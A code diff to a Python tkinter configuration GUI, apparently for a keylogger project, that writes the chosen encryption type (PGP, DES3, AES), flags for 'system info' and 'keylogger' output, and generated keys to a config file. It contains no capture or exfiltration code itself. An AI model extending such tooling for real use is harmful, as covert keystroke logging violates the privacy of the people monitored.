@@ -9,14 +9,14 @@ from tkinter import messagebox
 import socket
 import sys
 
+import Key_Generator
+
 class MyKeysGui(tk.Frame):
     def __init__(self, parent):
         tk.Frame.__init__(self, parent)
         self.parent = parent
 
         root.title("myKeys")
-
-        configFile = open('config.txt', "w+")
 
         # tab setup for configuration and decryption
         tab = ttk.Notebook(parent)
@@ -36,9 +36,6 @@ class MyKeysGui(tk.Frame):
         self.generatedKey = tk.StringVar()
         self.keyVar = tk.StringVar()
 
-        # TEMPORARY KEY VALUE
-        self.generatedKey.set('testkey')
-
         ######################################
         # Configuration Tab #
         ######################################
@@ -51,37 +48,43 @@ class MyKeysGui(tk.Frame):
                  pgpEntryEncrypt()
                  if (check1.get() == 1) & (check2.get() == 0):
                      # pgp encryption for system info only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('PGP\n')
                      configFile.write('1\n')
                      configFile.write('0\n')
 
-                     configFile.write(self.pgpEmail.get() + '\n')
-                     configFile.write(self.passPhrase.get())
-                     self.generatedKey.set(self.passPhrase.get())
+                     #configFile.write(self.pgpEmail.get() + '\n')
+                     
+                     #configFile.write(Key_Generator.pgp_generation(self.pgpEmail, self.passPhrase))
 
                      configFile.close()
 
                  elif (check2.get() == 1) & (check1.get() == 0):
                      # pgp encryption for keylogger only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('PGP\n')
                      configFile.write('0\n')
                      configFile.write('1\n')
 
-                     configFile.write(self.pgpEmail.get() + '\n')
-                     configFile.write(self.passPhrase.get())
-                     self.generatedKey.set(self.passPhrase.get())
+                     #configFile.write(self.pgpEmail.get() + '\n')
+                     
+                     #configFile.write(Key_Generator.pgp_generation(self.pgpEmail, self.passPhrase))
 
                      configFile.close()
 
                  elif (check1.get() == 1) & (check2.get() == 1):
                      # pgp encryption for system infor and keylogger
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('PGP\n')
                      configFile.write('1\n')
                      configFile.write('1\n')
 
-                     configFile.write(self.pgpEmail.get() + '\n')
-                     configFile.write(self.passPhrase.get())
-                     self.generatedKey.set(self.passPhrase.get())
+                     #configFile.write(self.pgpEmail.get() + '\n')
+                     
+                     #configFile.write(Key_Generator.pgp_generation(self.pgpEmail, self.passPhrase))
 
                      configFile.close()
 
@@ -101,68 +104,74 @@ class MyKeysGui(tk.Frame):
             elif (self.eType.get() == "DES3"):
                  if (check1.get() == 1) & (check2.get() == 0):
                      # DES3 encryption for system info only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('DES3\n')
                      configFile.write('1\n')
                      configFile.write('0\n')
+                     self.generatedKey.set(Key_Generator.DES3_generation())
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
                  elif (check2.get() == 1) & (check1.get() == 0):
                      # DES3 encryption for keylogger only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('DES3\n')
                      configFile.write('0\n')
                      configFile.write('1\n')
+                     self.generatedKey.set(Key_Generator.DES3_generation())
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
                  elif (check1.get() == 1) & (check2.get() == 1):
                      # DES3 encryption for system info and keylogger
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('DES3\n')
                      configFile.write('1\n')
                      configFile.write('1\n')
+                     self.generatedKey.set(Key_Generator.DES3_generation())
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
             elif (self.eType.get() == "AES"):
                  if (check1.get() == 1) & (check2.get() == 0):
                      # AES encryption for system info only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('AES\n')
                      configFile.write('1\n')
                      configFile.write('0\n')
+                     self.generatedKey.set(Key_Generator.generate_AES(self))
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
                  elif (check2.get() == 1) & (check1.get() == 0):
                      # AES encryption for keylogger only
+                     configFile = open('config.txt', "w+")
+
                      configFile.write('AES\n')
                      configFile.write('0\n')
                      configFile.write('1\n')
+                     self.generatedKey.set(Key_Generator.generate_AES(self))
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
                  elif (check1.get() == 1) & (check2.get() == 1):
                      # AES encryption for system info and keylogger
+                     configFile = open('config.txt', "w+")
+                     
                      configFile.write('AES\n')
                      configFile.write('1\n')
                      configFile.write('1\n')
+                     self.generatedKey.set(Key_Generator.generate_AES(self))
                      configFile.write(self.generatedKey.get())
-
-                     self.generatedKey.set('key here')
 
                      configFile.close()
 
